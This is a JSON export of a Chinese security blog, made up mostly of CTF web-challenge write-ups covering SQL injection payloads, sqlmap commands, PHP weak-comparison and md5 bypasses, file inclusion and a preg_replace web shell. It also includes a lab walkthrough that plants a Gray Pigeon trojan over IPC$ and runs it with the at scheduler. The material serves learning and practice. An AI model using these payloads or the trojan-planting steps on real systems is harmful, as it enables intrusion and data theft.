[{"title":"bugku1-10","date":"2020-09-06T14:26:41.000Z","path":"2020/09/06/bugku1-10/","text":"bugku刷题记录 web2查看源码即可 计算器修改前端代码 GETpayload: ?what=flag POST 矛盾payload: ?num=1a 考察点：弱类型比较 === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 == 在进行比较的时候，会先将字符串类型转化成相同，再比较 测试代码 1234567&lt;?phpvar_dump(\"admin\"==0); //truevar_dump(\"1admin\"==1); //truevar_dump(\"admin1\"==1) //falsevar_dump(\"admin1\"==0) //truevar_dump(\"0e123456\"==\"0e4456789\"); //true?&gt; //上述代码可自行测试 1231 观察上述代码，\"admin\"==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等2 \"1admin\"==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是\"admin1\"被转化成了0,为什么呢？？3 \"0e123456\"==\"0e456789\"相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等 web3查看源码后，在最下面看到一串编码，为unicode编码 1&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; 使用工具转换为字符穿 域名解析dns服务器用来解析域名为IP，很多国外的服务器不能访问，主要原因就是DNS服务器不能解析那些域名 hosts就是本地用来解析域名为IP 因此hosts文件中有的域名记录，在本电脑浏览器中可直接使用域名访问 （hosts文件需要管理员权限，修改方式为使用管理员权限运行记事本后打开hosts） 路径为：C:\\Windows\\System32\\drivers\\etc 文件保存后在浏览器中访问该域名 获得flag 你必须让他停下打开页面什么也没有，源码也没有什么发现，抓包试试 go完也没什么反应，有点迷惑 但是多go几次后，发现有张图片在变 多go几次就出来了flag,原理还未知 变量1123456789101112 &lt;?php error_reporting(0);include \"flag1.php\";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args))&#123; die(\"args error!\"); &#125; eval(\"var_dump($$args);\");&#125;?&gt; 首先看到要用get方式提交一个args参数，而在最后一行代码里又有var_dump(&amp;&amp;args)，于是传入args参数的值为GLOBALS,这样最后一行代码就变成了var_dump（&amp;GLOBALS），然后var_dump函数运行会输出所有变量，得出flag。 Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。 GLOBALS:一个包含了全部变量的全局组合数组 即将include”flag.php”作为全局变量在本页面输出 ?args=GLOBALS web5源码中一串特别的代码直接放在浏览器的控制台中运行 头等舱打开页面什么也没有 扫描目录，扫出来一大堆没用的，直接抓包 。。。。就出来了 网站被黑名字提示了，网站被黑。 打开题目，发现鼠标动不了，可能是被黑后的后遗症 先扫描目录发现了shell.php,这可能是上次黑客留下的小马文件 打开页面，需要密码，这就需要爆破了(查看了wp,知道了密码为hack,不知道时就需要一个足够大的密码字典才能破解) 确定要爆破的变量 加载密码字典 出现结果（根据length确定密码） 密码为hack 登录即可","tags":[{"name":"弱类型","slug":"弱类型","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"域名解析","slug":"域名解析","permalink":"https://sunzhengyu99.github.io/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"}]},{"title":"综合2","date":"2020-09-03T07:24:29.000Z","path":"2020/09/03/综合2/","text":"NCTF-综合2 进入页面，没什么特别的地方，随便点点 留言可以正常提交，本以为有xss,但是已经提示不是xss 看到最下面有个网站说明 本CMS说明 ，有用的内容如下 config.php：存放数据库信息，移植此CMS时要修改 index.php：主页文件 passencode.php：Funny公司自写密码加密算法库 say.php：用于接收和处理用户留言请求 sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索 admin表结构 create table admin ( id integer, username text, userpass text, ) http://cms.nuptzj.cn/about.php?file=sm.txt可以使用php伪协议任意读取文件内容。 包括自己 尝试读取index.php的源码，发现好像并没有什么用 读取`about.php 123456789101112131415161718&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;&lt;?php$file&#x3D;$_GET[&#39;file&#39;];if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123; &#x2F;&#x2F; 有config.php echo &quot;file参数不能为空！&quot;; exit();&#125;else&#123; $cut&#x3D;strchr($file,&quot;loginxlcteam&quot;); &#x2F;&#x2F;包含了 loginxlcteam页面 if($cut&#x3D;&#x3D;false)&#123; $data&#x3D;file_get_contents($file); $date&#x3D;htmlspecialchars($data); echo $date; &#125;else&#123; echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;; &#125;&#125; 读取config.php，无有用信息 查看loginxlcteam,是个登录页面 到此还是无从下手，参考大佬的博客 https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase 在搜索页面中也存在有用信息 http://cms.nuptzj.cn/about.php?file=so.php获取源码 123456789101112131415161718192021&lt;?php //so.phpif($_SERVER['HTTP_USER_AGENT']!=\"Xlcteam Browser\")&#123; //必须修改http头，吧user-agent改成Xlcteam Browserecho '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'; exit();&#125;$id=$_POST['soid']; //post 一个soidinclude 'config.php';include 'antiinject.php'; //防注入的文件include 'antixss.php'; //防xss的文件 $id=antiinject($id); //对id过滤$con = mysql_connect($db_address,$db_user,$db_pass) or die(\"不能连接到数据库！！\".mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(\"SELECT * FROM `message` WHERE display=1 AND id=$id\"); //sql查询，可能存在注入点$rs=mysql_fetch_array($result);echo htmlspecialchars($rs['nice']).':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'.antixss($rs['say']).'&lt;br /&gt;';mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt; 123456789101112&lt;?php //antiinject.php源码 function antiinject($content) &#123; $keyword=array(\"select\",\"union\",\"and\",\"from\",' ',\"'\",\";\",'\"',\"char\",\"or\",\"count\",\"master\",\"name\",\"pass\",\"admin\",\"+\",\"-\",\"order\",\"=\"); //对一些sql注入时用到的关键词进行了过滤 $info=strtolower($content); for($i=0;$i&lt;=count($keyword);$i++) &#123; $info=str_replace($keyword[$i], '',$info); &#125; return $info; &#125; ?&gt; 大致意思就是 1.判断http请求头中的user-agent参数是否为Xlcteam Browser 2.post参数soid 3.对soid进行过滤后带入sql语句中查询 于是抓包修改user-agent 确定存在注入点 由于之前提示了admin表结构 create table admin ( id integer, username text, userpass text, ) 可直接写出查询语句 1(sselectelect/**/group_concat(userppassass)/**/ffromrom/**/aadmindmin) ASCII码转字符串结果为： fuckruntu 登录 http://cms.nuptzj.cn/about.php?file=xlcteam.php 查看源码 12345 &lt;?php $e = $_REQUEST['www']; $arr = array($_POST['wtf'] =&gt; '|.*|e',); array_walk($arr, $e, ''); ?&gt; 看样子是可以用菜刀连接的 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：参考https://www.jb51.net/article/38714.htm简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。用菜刀连接： url:http://cms.nuptzj.cn/xlcteam.php?www=preg_replace 密码：wtf 总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"shell","slug":"shell","permalink":"https://sunzhengyu99.github.io/tags/shell/"}]},{"title":"nctf-2","date":"2020-09-02T09:13:08.000Z","path":"2020/09/02/nctf-2/","text":"NCTF-2 SQL注入1题目源码给出 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=\"select user from ctf where (user='\".$user.\"') and (pw='\".$pass.\"')\"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==\"admin\") &#123; echo \"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;\"; &#125; if($query[user] != \"admin\") &#123; echo(\"&lt;p&gt;You are not admin!&lt;/p&gt;\"); &#125;&#125;echo $query[user];?&gt; 首先post方法传递user和pass两个参数，然后带入sql语句中查询 注入点在这个位置 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot; select user from ctf where (user=&#39;&#39;) and (pw=&#39;&#39;) 构造语句 select user from ctf where (user=&#39;admin&#39;) or 1=1 #) and (pw=&#39;&#39;) 在username中填入admin&#39;) or 1=1 #或者admin&#39;) and 1=1 #，提交即可获得flag passcheck12345678910111213$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo \"flag:nctf&#123;*&#125;\";&#125;else&#123;echo \"the pass is wrong!\";&#125;&#125;else&#123;echo \"please input pass!\";&#125;?&gt; strcmp() 函数比较两个字符串。 注释：strcmp() 函数是二进制安全的，且对大小写敏感。 提示：该函数与 strncmp() 函数类似，不同的是，通过 strncmp() 您可以指定每个字符串用于比较的字符数。 只有pass==pass1时才显示flag 感觉跟之前的变量覆盖相似 知识点： strcmp()函数 ：php5.3之前的strcmp的漏洞，当参数中的一个字符串是对象或者数组时，函数会返回0； hackbar的使用，post方法 php弱类型，数组的使用。 参考： https://www.cnblogs.com/islsy/p/10667426.html 起名字真难123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) //number中的数字不能在1-9 &#123; return false; &#125; &#125; return $number == '54975581388'; //number的值等于54975581388，与之前if语句矛盾&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag;else echo 'access denied';?&gt; 尝试将54975581388转成十六进制 0xccccccccc, c的a值为12，满足if判断语句 ?key=0xccccccccc sqlinject查看源码 1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require 'db.inc.php';function clean($str)&#123; if(get_magic_quotes_gpc())&#123; //防止注入 $str=stripslashes($str); //添加 \\ &#125; return htmlentities($str, ENT_QUOTES);//过滤掉单引号，双引号，或者兼而有之&#125;$username = @clean((string)$_GET['username']);//对获取的参数进行了处理$password = @clean((string)$_GET['password']);$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';//存在注入的语句$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125;echo $flag;--&gt; magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误 SELECT * FROM users WHERE name=\\&#39;&#39;.$username.&#39;\\&#39; AND pass=\\&#39;&#39;.$password.&#39;\\&#39;; 反斜杠遇到单引号后，起到转义作用，实际sql语句如下 SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;; 这里注入与之前的注入不同，这里针对的是password SELECT * FROM users WHERE name=&#39; \\&#39; AND pass=&#39; or 1=1 --+&#39;; \\&#39; AND pass= 作为name 参数的值 所以构造?name=&amp;password=or 1=1 –+ SQL注入2123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; //post 方式接收两个参数 mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]);//对pass md5加密 $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user='$user'\"));//获取pw字段的值 if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; // 比较pass和pw echo \"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;\"; &#125; else &#123; echo(\"&lt;p&gt;Log in failure!&lt;/p&gt;\"); &#125;&#125;?&gt; poyload: user= &#39; union select md(1) &amp;pass=1 select pw from ctf where user=&#39;&#39; union select md(1) 此查询语句获得我pw值为md(1),所以if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))语句成立，显示flag (还没完全理解) 综合题 首页中给出很长的jsfuck，可以使用浏览器的console解码 ,给出一个页面 访问 1bc29b36f623ba82aaf6724fd3b16718.php 提示在header里 查看header history of bash使用过linux的同志会知道，如果使用的是bash，在家目录中会生成.bash_history文件用来保存历史命令。访问.bash_history文件，可以得到这样的历史命令 url: http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 获得zip -r flagbak.zip ./* 访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip file_get_contents查看源码获取被注释的内容 1234$file = $_GET['file'];if(@file_get_contents($file) == \"meizijiu\")&#123; echo $nctf;&#125; 分析可得 通过get方式传递flle=文件名并且这个文件的内容==‘meizijiu’如果等于就打印flag php伪协议php://input来构造原始数据的只读流 变量覆盖参考 https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1 源码 123456&lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == \"meizijiu233\")&#123; echo $flag;&#125;--&gt; ?name=meizijiu233","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"弱类型","slug":"弱类型","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}]},{"title":"nctf","date":"2020-08-29T14:38:08.000Z","path":"2020/08/29/nctf/","text":"nctf-1 签到题查看源码即可看到flag md5 collision一道简单的md5漏洞题目 md5函数漏洞 源码 12345678910$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\";&#125; else &#123; echo \"false!!!\";&#125;&#125;else&#123;echo \"please input a\";&#125; 即使用get方式传递一个参数a,使得a的值不等于QNKCDZO但是二者的md5值相同 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有 1234567891011QNKCDZO240610708s878926199as155964671as214587387as214587387a sha1(str)sha1('aaroZmOk') sha1('aaK1STfY')sha1('aaO8zKZF')sha1('aa3OFF9m') 签到2提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母 F12审查元素，修改输入框的maxlength值，大于11即可 再次输入口令即可。 考点为前端代码修改 这题不是WEB这道题还真不是web 进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex 层层递进 题目为层层递进，通过F12中Sources功能，查看网站的包含情况，发现到可疑地址：SO.html，查看发现相似可以地址，最后在404.html源码中得到flag（竖排插入在标签中）： 单身二十年tip:在这里找key 点击发现url改变，跳转到了另一个页面 bp抓包试试，go一下，相应包中出现flag phpencode一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错 将最后的eval改为echo,提交运行即可 LFI 黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。 根据PHP伪协议尝试构造如下Payload：?file=php://filter/read=convert.base64-encode/resource=index.php，将index.php的源码经过Base64编码输出 PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4= base64解码 1234567891011121314&lt;html&gt; &lt;title&gt;asdf&lt;&#x2F;title&gt;&lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;&#x2F;html&gt; 单身一百年也没用与单身二十年一样，抓包即可 cookie Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息 。 TIP: 0==not bp抓包，将cookie:login = 0改cookie:login=1 go MYSQL进入题目，提示robots协议 robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。 robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。 查看robots.txt url:http://chinalover.sinaapp.com/web11/robots.txt 12TIP:sql.php//这里提示sql.php的源码如下 1234567891011121314&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\")); if ($_GET[id]==1024) &#123; echo \"&lt;p&gt;no! try again&lt;/p&gt;\"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形） 之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。 http://chinalover.sinaapp.com/web11/sql.php?id=10 尝试id=10，无结果 id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句 想到了intval()函数的作用，尝试id=1024.1 GBK Injection宽字节注入，之前写过。 /x0012345678if (isset ($_GET['nctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 试了试?nctf[]=1,出现了报错但是答案真就出来了 正儿八经的做法是?nctf=1%00%23biubiubiu，简单的代码审计 bypass again12345678910&lt;?phpif (isset($_GET['a']) and isset($_GET['b']))&#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) == md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125; ?&gt; 代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞 在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。 payload: http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3 伪装者bp抓包，添加X-Forwarded-For=127.0.0.1,发包即可 X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"代码审计","slug":"代码审计","permalink":"https://sunzhengyu99.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"bypass","slug":"bypass","permalink":"https://sunzhengyu99.github.io/tags/bypass/"}]},{"title":"SSTI","date":"2020-08-16T14:08:06.000Z","path":"2020/08/16/SSTI/","text":"https://www.cnblogs.com/wangtanzhi/p/12238779.html","tags":[{"name":"STTI","slug":"STTI","permalink":"https://sunzhengyu99.github.io/tags/STTI/"}]},{"title":"Bugku","date":"2020-08-08T14:40:51.000Z","path":"2020/08/08/Bugku/","text":"Bugku刷题 成绩单123` 1' and 1=1 # ` ` 1' and 1=2 # ` 不显示内容，可以判断存在注入点 手工注入1.1&#39; order by 4#可正常显示可以判断存在四个字段2.爆数据库` -1&apos; union select 1,database(),3,4 #` database:skctf_flag3.爆出表名-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc 4.字段名-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag 得到flag (select skctf_flag from skctf_flag.fl4g) sqlmap 因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中 1.获取数据库python2 sqlmap.py -r a.txt --dbs 2.获取表名python2 sqlmap.py -r a.txt -D skctf_flag --tables 3.获取列名python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns 4.获取flagpython2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump 备份是个好习惯 扫描发现了index.php，通过 index.php.bak下载网页源码 123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once \"flag.php\";ini_set(\"display_errors\", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;echo $flag.\"取得flag\";&#125;?&gt; 对上传的值进行了过滤key, kekeyy可以绕过 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等 payload: ?kekey1[]=da&amp;kekey2[]=dada 2.利用==比较漏洞 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 下列的字符串的MD5值都是0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 多次爆数据库名 http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+ database:web1002-1 爆表名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+flag1,hint 爆字段名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos; --+flag1,address获取内容 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+usOwycTju+FTUUzXosjr 提交发现不对 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+获取address中的内容 ./Once_More.php下一关地址得到另外一个地址 http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23给出提示XPATH syntax error: ‘class,flag2‘ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23Unknown column ‘flag2’ in ‘where clause’ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23XPATH syntax error: ‘flag{Bugku-sql_6s-2i-4t-bug}‘ ！！！注意把flag改为小写字母 宽字节注入靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 一、手工注入第一步 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27加单引号报错 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,table_name from information_schema.tables where table_schema=database()%23查看所有的表 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23查看表中的列 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23 ctf,ctf2,ctf3,ctf4,gbksqli,news0x637466 为十六进制ctf 获取字段内容 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(pw) from ctf %23flag:nctf{h4cked_By_w00dPeck3r} 二、sqlmap注入检测是否有注入点 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27没有成功使用十六进制 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex获取数据库名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --dbs //选择十六进制 获取数据库名 单引号使用url编码获取表名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --D sae-chinalover --tables获取flag sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex -D sae-chinalover -T ctf --dump","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"木马","date":"2020-07-18T12:34:10.000Z","path":"2020/07/18/木马/","text":"初识木马 实验目的使用灰鸽子软件以及端口爆破软件控制目的主机 准备一台xp，一台2003其中xp地址为10.1.1.3/24 2003为10.1.1.1/24使两个主机能够通信xp作为攻击方，2003为受害者 1.制作木马使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用） 2.扫描主机，并对账号密码进行爆破ip起始地址为10.1.1.1-10.1.1.255密码配置文件其实只要扫描10.1.1.1即可（因为是实验） 获取账号密码username：administratorpassword: “” 3.与目标主机建立IPC$net use \\\\10.1.1.1\\ipc$ &quot;&quot; \\user:administrator 4.植入木马到目标主机copy C:\\Documents and Settings\\shimisi\\桌面\\qq.exe \\\\10.1.1.1\\ipc$ 5.设置目标主机运行木马net time \\\\10.1.1.1根据目标主机时间设置事物的开始时间at \\\\10.1.1.1 17:17 c:\\qq.exe在上面的时间之后三分钟左右设置一个事物即在17：17时运行木马文件 6.成功控制目标主机观察目标主机已自动上线，已可以进行监控或传输数据等操作 获取屏幕内容 控制命令行","tags":[]},{"title":"jdtest","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/jdtest/","text":"爬取京东商品图片的小测试 访问的页面图片链接的位置 123456789101112131415161718192021222324252627282930313233# -*- coding = utf - 8 -*-#@Time : 2020/7/16 14:54#@Author : sunzy#@File : jd.pyimport reimport requestsimport timeimport osdir = \"jdtp\"if not os.path.exists(dir): os.mkdir(dir)baseurl = \"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu\"head = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61\" &#125;response = requests.get(url=baseurl, headers = head)#print(response.text)html = response.textfindlinks = '&lt;img width=\"220\" height=\"220\" data-img=\"\\d\" src=\"(.*?)\".*?&gt;'#&lt;img width=\"220\" height=\"220\" data-img=\"1\" 